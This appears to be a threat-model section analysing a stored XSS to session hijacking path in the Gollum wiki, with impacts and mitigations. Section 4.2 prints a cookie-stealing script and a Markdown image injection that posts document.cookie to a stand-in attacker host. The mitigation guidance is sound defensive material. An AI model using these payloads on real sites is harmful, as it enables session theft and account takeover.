### 4. Deep Analysis of Attack Tree Path: Stored XSS -> Session Hijacking -> Compromise User Accounts

#### 4.1. Attack Vector: Vulnerabilities in Gollum's Markup Parsing

**Detailed Explanation:**

Gollum, like many wiki systems, relies on markup languages (primarily Markdown, but potentially others depending on configuration and extensions) to format user-generated content.  The core vulnerability lies in the potential for Gollum's markup parser to incorrectly process or fail to sanitize certain markup constructs, allowing an attacker to inject arbitrary HTML and, critically, JavaScript code.

**Specific Injection Points in Markup (Examples for Markdown):**

*   **Image Tags:**  Markdown image syntax `![alt text](image URL)` can be exploited if the `image URL` is not properly sanitized. An attacker could inject a JavaScript payload within the `alt text` attribute or even within the `image URL` itself using `javascript:` URLs (though this is less common and often blocked by browsers). More commonly, the `alt text` is rendered unsanitized, allowing for injection.
*   **Link Tags:** Similar to images, Markdown link syntax `[link text](URL)` can be vulnerable.  The `URL` could be manipulated to include `javascript:` URLs or the `link text` could be used for injection if not properly encoded during rendering.
*   **HTML Tags (if allowed):** If Gollum's Markdown parser allows passthrough of raw HTML tags (e.g., `<script>`, `<iframe>`, `<a>` with `javascript:` href), this presents a direct and obvious injection point. Even seemingly harmless tags like `<img>` or `<a>` can be exploited if attributes like `onerror`, `onload`, or `href` are not properly sanitized.
*   **Markdown Extensions/Plugins:** If Gollum uses extensions or plugins to enhance Markdown functionality, these can introduce new parsing logic and potentially new vulnerabilities if not developed with security in mind.

**Why Stored XSS is Critical:**

Stored XSS is particularly dangerous because the malicious script is persistently stored within the wiki's database.  Every time a user views the affected page, the script is executed in their browser. This makes it a highly effective attack vector as it requires no further interaction from the attacker after the initial injection.

#### 4.2. Exploitation: Injecting Malicious JavaScript and Hijacking Sessions

**Step-by-Step Exploitation Scenario:**

1.  **Vulnerability Identification:** The attacker identifies a vulnerable point in Gollum's markup parsing. This could be through manual testing, automated scanning, or by exploiting a known vulnerability. For example, they might find that the `alt text` attribute in Markdown image tags is not properly sanitized.

2.  **Malicious Payload Crafting:** The attacker crafts a malicious JavaScript payload designed to steal session cookies. A typical payload would look something like this:

    ```javascript
    <script>
      var cookieData = document.cookie;
      var xhr = new XMLHttpRequest();
      xhr.open("POST", "https://attacker.example.com/log_cookie"); // Attacker's server
      xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
      xhr.send("cookie=" + encodeURIComponent(cookieData));
    </script>
    ```

    **Explanation of Payload:**
    *   `document.cookie`:  This JavaScript property retrieves all cookies associated with the current domain (the Gollum wiki). This includes session cookies.
    *   `XMLHttpRequest`:  Used to send the stolen cookie data to the attacker's server in the background without the user's direct knowledge.
    *   `https://attacker.example.com/log_cookie`:  This is a URL controlled by the attacker where they will receive and log the stolen cookies. **This is a placeholder and should be replaced with the attacker's actual server.**
    *   `setRequestHeader` and `send`:  Sets up a POST request to send the cookie data as part of the request body. `encodeURIComponent` ensures the cookie data is properly encoded for transmission.

3.  **Injection into Wiki Page:** The attacker injects this malicious payload into a Gollum wiki page using the identified vulnerability. For example, if the `alt text` in image tags is vulnerable, they might create a Markdown image like this:

    ```markdown
    ![<img src='x' onerror='var cookieData = document.cookie; var xhr = new XMLHttpRequest(); xhr.open(\"POST\", \"https://attacker.example.com/log_cookie\"); xhr.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\"); xhr.send(\"cookie=\" + encodeURIComponent(cookieData));'>](https://example.com/valid_image.png)
    ```

    **Explanation of Injection:**
    *   The `alt text` is crafted to contain an `<img>` tag.
    *   The `onerror` attribute of the `<img>` tag is used to execute the JavaScript payload when the image fails to load (which it will, as 'x' is not a valid image source). This is a common XSS technique.
    *   The `image URL` is set to a valid image to avoid immediately triggering errors that might alert the user or system.

4.  **Victim Accesses Page:** A legitimate user of the Gollum wiki accesses the page containing the injected malicious Markdown.

5.  **Script Execution and Cookie Theft:** When the victim's browser renders the page, the injected JavaScript code within the `onerror` attribute is executed. This script steals the victim's session cookies and sends them to the attacker's server (`attacker.example.com/log_cookie`).

6.  **Session Hijacking:** The attacker receives the victim's session cookies. They can now use these cookies to impersonate the victim and access the Gollum wiki as if they were the legitimate user. This is typically done by importing the stolen cookies into the attacker's browser or using tools to replay requests with the stolen cookies.

#### 4.3. Impact: Account Takeover and Further Malicious Activities

**Consequences of Successful Session Hijacking:**

*   **Account Takeover:** The most immediate impact is complete account takeover. The attacker gains full control of the victim's account within the Gollum wiki.

*   **Data Breach and Confidentiality Loss:**
    *   **Access to Private Wikis:** If the victim has access to private wikis, the attacker can now access and view all confidential information stored within those wikis.
    *   **Reading Sensitive Content:** The attacker can read any content the victim is authorized to access, potentially including sensitive documents, internal communications, or project details.

*   **Integrity Compromise:**
    *   **Content Manipulation:** The attacker can modify, delete, or create wiki pages under the victim's identity. This can be used to spread misinformation, deface the wiki, or disrupt operations.
    *   **Planting Backdoors:** The attacker could inject further malicious code into other wiki pages, potentially establishing persistent backdoors or escalating privileges within the system.

*   **Availability Disruption:**
    *   **Denial of Service (Indirect):** By deleting critical wiki pages or disrupting workflows, the attacker can indirectly cause a denial of service for legitimate users.
    *   **Reputational Damage:** If the wiki is publicly accessible or used for external communication, defacement or data breaches can severely damage the organization's reputation.

*   **Lateral Movement and Further Attacks:** A compromised Gollum account can be a stepping stone for further attacks. The attacker might:
    *   Use the compromised account to gain access to other internal systems if the Gollum wiki is integrated with other services (e.g., using single sign-on).
    *   Exploit trust relationships within the wiki to launch social engineering attacks against other users.

**Risk Level:**

This attack path is classified as **HIGH RISK** due to:

*   **Ease of Exploitation:** Stored XSS vulnerabilities can be relatively easy to exploit once identified.
*   **High Impact:** Account takeover and data breaches are severe security incidents.
*   **Persistence:** Stored XSS affects all users who view the compromised page, leading to potentially widespread impact.

#### 4.4. Mitigation Strategies

**Recommended Mitigations and Implementation Details:**

1.  **Robust Input Sanitization and Output Encoding:**

    *   **Input Sanitization:**
        *   **Identify Input Points:**  Pinpoint all areas where user-provided markup is processed (e.g., page editing, comments, potentially file uploads if they involve markup parsing).
        *   **Choose a Sanitization Library:**  Utilize a well-vetted and actively maintained HTML sanitization library specifically designed for the markup languages Gollum supports (e.g., for Markdown, libraries that can sanitize the rendered HTML output).  **Avoid writing custom sanitization logic, as it is prone to bypasses.**
        *   **Whitelist Approach:**  Configure the sanitization library to allow only a safe subset of HTML tags and attributes.  Strictly limit or completely disallow potentially dangerous tags like `<script>`, `<iframe>`, `<object>`, `<embed>`, etc.
        *   **Attribute Sanitization:**  Carefully sanitize attributes of allowed tags, especially event handlers (e.g., `onerror`, `onload`, `onclick`) and URL attributes (e.g., `href`, `src`).  Remove or neutralize JavaScript URLs (`javascript:`) and data URLs if not strictly necessary.

    *   **Output Encoding:**
        *   **Context-Aware Encoding:**  Apply output encoding based on the context where the user-provided content is being rendered.  For HTML output, use HTML entity encoding to escape characters that have special meaning in HTML (e.g., `<`, `>`, `&`, `"`).
        *   **Encoding at Rendering Time:**  Ensure encoding is applied *at the point of rendering* the content in the user's browser, not just during storage in the database. This prevents bypasses if data is stored in a partially sanitized or unencoded form.

2.  **Content Security Policy (CSP):**

    *   **Implement CSP Headers:** Configure Gollum's web server to send appropriate CSP headers in HTTP responses.
    *   **Restrict Inline Scripts:**  Use CSP directives to strictly limit or completely disallow inline JavaScript execution (`script-src 'self'`). This is a crucial defense against XSS.
    *   **Control Resource Loading:**  Use CSP directives to control the sources from which the browser is allowed to load resources like scripts, images, stylesheets, and objects (`img-src 'self'`, `style-src 'self'`, `object-src 'none'`, etc.).  `'self'` restricts loading to the same origin as the Gollum wiki.
    *   **Report-Only Mode (Initially):**  Start by deploying CSP in report-only mode (`Content-Security-Policy-Report-Only`) to monitor for violations without breaking existing functionality. Analyze reports to fine-tune the policy before enforcing it.
    *   **Strict CSP:** Aim for a strict CSP policy that minimizes the attack surface.  Avoid overly permissive policies that negate the benefits of CSP.

3.  **Regular Security Testing Focused on XSS:**

    *   **Penetration Testing:** Conduct regular penetration testing, specifically targeting XSS vulnerabilities in markup parsing.  Engage security professionals to perform these tests.
    *   **Automated Scanning:** Integrate automated vulnerability scanners into the development pipeline to detect potential XSS issues early in the development lifecycle.
    *   **Fuzzing:**  Employ fuzzing techniques to test the robustness of the markup parser against a wide range of potentially malicious inputs.
    *   **Code Reviews:**  Conduct thorough code reviews of any changes to markup parsing logic or related components, focusing on security implications.

4.  **Keep Gollum and Dependencies Updated:**

    *   **Patch Management:**  Establish a robust patch management process to promptly apply security updates for Gollum itself and all its dependencies (libraries, frameworks, etc.).
    *   **Security Advisories:**  Subscribe to security mailing lists and monitor security advisories for Gollum and its ecosystem to stay informed about known vulnerabilities and available patches.
    *   **Dependency Scanning:**  Use dependency scanning tools to identify outdated or vulnerable dependencies in Gollum's project.

**Prioritization of Mitigations:**

*   **Input Sanitization and Output Encoding (High Priority):** This is the most fundamental and essential mitigation for XSS. It should be implemented robustly and thoroughly.
*   **Content Security Policy (High Priority):** CSP provides a strong defense-in-depth layer and significantly reduces the impact of XSS vulnerabilities, even if sanitization is bypassed in some cases.
*   **Regular Security Testing (Medium Priority):**  Essential for proactively identifying and addressing vulnerabilities before they can be exploited. Should be integrated into the development lifecycle.
*   **Keep Gollum and Dependencies Updated (Medium Priority):**  Crucial for addressing known vulnerabilities, but less effective against zero-day exploits.

**Conclusion:**

The Stored XSS -> Session Hijacking attack path represents a significant security risk for Gollum wikis. By implementing the recommended mitigation strategies, particularly robust input sanitization, output encoding, and Content Security Policy, the development team can significantly reduce the likelihood and impact of this attack vector, protecting user accounts and sensitive wiki data. Regular security testing and proactive patch management are also crucial for maintaining a secure Gollum environment over time.
